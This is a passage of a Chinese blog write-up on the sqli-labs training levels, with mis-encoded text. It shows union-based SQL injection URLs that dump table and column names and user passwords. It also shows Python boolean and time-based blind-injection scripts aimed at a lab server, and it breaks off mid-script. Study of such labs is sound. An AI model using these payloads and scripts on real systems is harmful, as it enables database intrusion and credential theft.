&lt;li&gt;æ„é€ ï¼š&lt;code&gt;127.0.0.1/Less-1/?id=-1&amp;#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&amp;#39;security&amp;#39;)--+&lt;/code&gt;æŸ¥è¯¢è¡¨å&lt;br&gt;æ­¤æ—¶â€˜securityâ€™å¯ä»¥ç”¨åå…­è¿›åˆ¶æ›¿æ¢ï¼Œæˆ–è€…ç”¨database()&lt;br&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/4.png&#34; alt=&#34;sql&#34;&gt;&lt;/li&gt;
&lt;li&gt;æ„é€ ï¼š&lt;code&gt;127.0.0.1/Less-1/?id=-1&amp;#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&amp;#39;users&amp;#39;)--+&lt;/code&gt;æŸ¥è¯¢æ®µå&lt;br&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/5.png&#34; alt=&#34;sql&#34;&gt;&lt;/li&gt;
&lt;li&gt;æ„é€ ï¼š&lt;code&gt;?id=-1&amp;#39; union select 1,2,(select concat_ws(0x7e,username,password) from security.users limit 0,1)--+&lt;/code&gt;æŸ¥è¯¢æ•°æ®&lt;br&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/6.png&#34; alt=&#34;sql&#34;&gt;&lt;br&gt;ä¹Ÿå¯ä»¥æ„é€ ï¼š&lt;code&gt;?id=-1&amp;#39; union select 1,2,(select group_concat(username,0x7e,password) from security.users)--+&lt;/code&gt;æŸ¥è¯¢æ•°æ®&lt;br&gt;&lt;img src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/7.png&#34; alt=&#34;sql&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;è‡³æ­¤ï¼Œsqli-labsçš„ç¬¬ä¸€å…³å°±ç®—æ˜¯ç»“æŸäº†&lt;/p&gt;
&lt;h2 id=&#34;Less-2&#34;&gt;&lt;a href=&#34;#Less-2&#34; class=&#34;headerlink&#34; title=&#34;Less-2&#34;&gt;&lt;/a&gt;Less-2&lt;/h2&gt;&lt;p&gt;è¿™ä¸€å…³æ€»ä½“å’Œç¬¬ä¸€å…³æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯è¿™é‡Œæ˜¯æ•´å‹æ³¨å…¥ï¼Œå› æ­¤ä¸ç”¨å•å¼•å·å»é—­åˆï¼Œå…¶ä½™æ“ä½œå’Œç¬¬ä¸€å…³ç›¸åŒ&lt;/p&gt;
&lt;h2 id=&#34;Less-3&#34;&gt;&lt;a href=&#34;#Less-3&#34; class=&#34;headerlink&#34; title=&#34;Less-3&#34;&gt;&lt;/a&gt;Less-3&lt;/h2&gt;&lt;p&gt;è¿™ä¸€å…³æ˜¯åˆ©ç”¨&lt;code&gt;&amp;#39;)&lt;/code&gt;æ¥é—­åˆ&lt;/p&gt;
&lt;h2 id=&#34;Less-4&#34;&gt;&lt;a href=&#34;#Less-4&#34; class=&#34;headerlink&#34; title=&#34;Less-4&#34;&gt;&lt;/a&gt;Less-4&lt;/h2&gt;&lt;p&gt;è¿™ä¸€å…³æ˜¯åˆ©ç”¨&lt;code&gt;&amp;quot;)&lt;/code&gt;æ¥é—­åˆ&lt;/p&gt;
&lt;h2 id=&#34;Less-5&#34;&gt;&lt;a href=&#34;#Less-5&#34; class=&#34;headerlink&#34; title=&#34;Less-5&#34;&gt;&lt;/a&gt;Less-5&lt;/h2&gt;&lt;p&gt;è¿™å…³å¼€å§‹å°±æ˜¯ç›²æ³¨äº†ï¼Œå¹¶ä¸”é€šè¿‡åˆ¤æ–­å¯ä»¥å¾—çŸ¥è¿™æ˜¯å¸ƒå°”ç›²æ³¨&lt;br&gt;ç›´æ¥ä¸¢å‡ºè„šæœ¬ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight n1ql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs n1ql&#34;&gt;import requests&lt;br&gt;import time&lt;br&gt;&lt;br&gt;url = &amp;quot;http://47.96.233.216:8080/Less-5/?id=1&amp;#x27;&amp;quot;&lt;br&gt;&lt;br&gt;test = &amp;quot;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;()&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;schema = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; schema_name &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;table = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; table_name &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.tables &lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt; table_schema=&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;() &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;column = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; column_name &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.columns &lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt; table_name=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;users&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;data = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; concat_ws(&lt;span class=&#34;hljs-number&#34;&gt;0x5e&lt;/span&gt;,username,&lt;span class=&#34;hljs-keyword&#34;&gt;password&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; security.users &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;result = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;for i in range(1,10):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	for j in range(48,122):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		payload = url + &amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; ascii(&lt;span class=&#34;hljs-built_in&#34;&gt;substr&lt;/span&gt;((&amp;#123;&amp;#125;),&amp;#123;&amp;#125;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))=&amp;#123;&amp;#125;--+&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.format(data,i,j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		# print(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		r = requests.get(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		l = len(r.text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		# print(l)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		if(l==704):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			result+=chr(j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			print(result)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			break&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;è¿™ä¸ªè„šæœ¬è¿˜æ˜¯æ¯”è¾ƒåå‘æ‰‹åŠ¨åŒ–çš„ã€‚ã€‚ã€‚ã€‚&lt;/p&gt;
&lt;h2 id=&#34;Less-6&#34;&gt;&lt;a href=&#34;#Less-6&#34; class=&#34;headerlink&#34; title=&#34;Less-6&#34;&gt;&lt;/a&gt;Less-6&lt;/h2&gt;&lt;p&gt;ç”¨&lt;code&gt;&amp;quot;&lt;/code&gt;é—­åˆ&lt;/p&gt;
&lt;h2 id=&#34;Less-7&#34;&gt;&lt;a href=&#34;#Less-7&#34; class=&#34;headerlink&#34; title=&#34;Less-7&#34;&gt;&lt;/a&gt;Less-7&lt;/h2&gt;&lt;p&gt;ç”¨&lt;code&gt;&amp;#39;))&lt;/code&gt;é—­åˆï¼Œä½†æ˜¯æ­¤æ—¶çš„è®¾å®šæ˜¯æ— è®ºæ˜¯å¦æ­£ç¡®ï¼Œè¿”å›çš„æ•°æ®é•¿åº¦æ˜¯ä¸€æ ·çš„ã€‚æ­¤æ—¶æ”¹å˜åˆ¤æ–­æ–¹å¼ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight n1ql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs n1ql&#34;&gt;import requests&lt;br&gt;&lt;br&gt;url = &amp;quot;http://47.96.233.216:8080/Less-7/?id=1&amp;#x27;))&amp;quot;&lt;br&gt;&lt;br&gt;test = &amp;quot;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;()&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;schema = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; schema_name &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;table = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; table_name &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.tables &lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt; table_schema=&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;() &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;column = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; column_name &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.columns &lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt; table_name=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;users&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;data = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; concat_ws(&lt;span class=&#34;hljs-number&#34;&gt;0x5e&lt;/span&gt;,username,&lt;span class=&#34;hljs-keyword&#34;&gt;password&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; security.users &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;result = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;for i in range(1,10):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	for j in range(48,122):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		payload = url + &amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; ascii(&lt;span class=&#34;hljs-built_in&#34;&gt;substr&lt;/span&gt;((&amp;#123;&amp;#125;),&amp;#123;&amp;#125;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))=&amp;#123;&amp;#125;--+&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.format(test,i,j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		r = requests.get(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		txt = r.text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		l = len(r.text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		s = &amp;quot;&lt;/span&gt;You are &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt;.... &lt;span class=&#34;hljs-keyword&#34;&gt;Use&lt;/span&gt; outfile......&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		if(s in txt):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			result+=chr(j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			print(result)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			break&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;Less-8&#34;&gt;&lt;a href=&#34;#Less-8&#34; class=&#34;headerlink&#34; title=&#34;Less-8&#34;&gt;&lt;/a&gt;Less-8&lt;/h2&gt;&lt;p&gt;è¿™ä¸€å…³çš„é—­åˆæ–¹å¼è¿˜æ˜¯å•å¼•å·ï¼Œè€Œä¸”å¥½åƒå’Œç¬¬äº”å…³æ²¡å•¥å·®åˆ«ï¼Ÿï¼Ÿï¼Ÿåªè¦æ”¹ä¸€ä¸‹è¿”å›æ•°æ®é•¿åº¦è„šæœ¬ä¸€æ ·æ˜¯å¯ä»¥ç”¨çš„ï¼Ÿï¼Ÿ&lt;/p&gt;
&lt;h2 id=&#34;Less-9&#34;&gt;&lt;a href=&#34;#Less-9&#34; class=&#34;headerlink&#34; title=&#34;Less-9&#34;&gt;&lt;/a&gt;Less-9&lt;/h2&gt;&lt;p&gt;é€šè¿‡æµ‹è¯•æˆ‘ä»¬å¯ä»¥å‘ç°æ— è®ºæ‰€æŸ¥è¯¢çš„æ•°æ®æ˜¯å¦å­˜åœ¨ï¼Œéƒ½ä¼šè¿”å›â€You are inâ€¦.â€œï¼Œå¯ä»¥æ¨æ–­è¿™æ¬¡ä¸æ˜¯å¸ƒå°”ç›²æ³¨è€Œæ˜¯æ—¶é—´ç›²æ³¨ã€‚ä¸¢å‡ºæ—¶é—´ç›²æ³¨çš„è„šæœ¬ï¼š&lt;/p&gt;
&lt;figure class=&#34;highlight n1ql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs n1ql&#34;&gt;import requests&lt;br&gt;import time&lt;br&gt;&lt;br&gt;url = &amp;quot;http://47.96.233.216:8080/Less-9/?id=1&amp;#x27;&amp;quot;&lt;br&gt;&lt;br&gt;test = &amp;quot;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;()&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;schema = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; schema_name &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;table = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; table_name &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.tables &lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt; table_schema=&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;() &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;column = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; column_name &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.columns &lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt; table_name=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;users&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;data = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; concat_ws(&lt;span class=&#34;hljs-number&#34;&gt;0x5e&lt;/span&gt;,username,&lt;span class=&#34;hljs-keyword&#34;&gt;password&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; security.users &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;result = &amp;quot;&lt;/span&gt;&lt;span 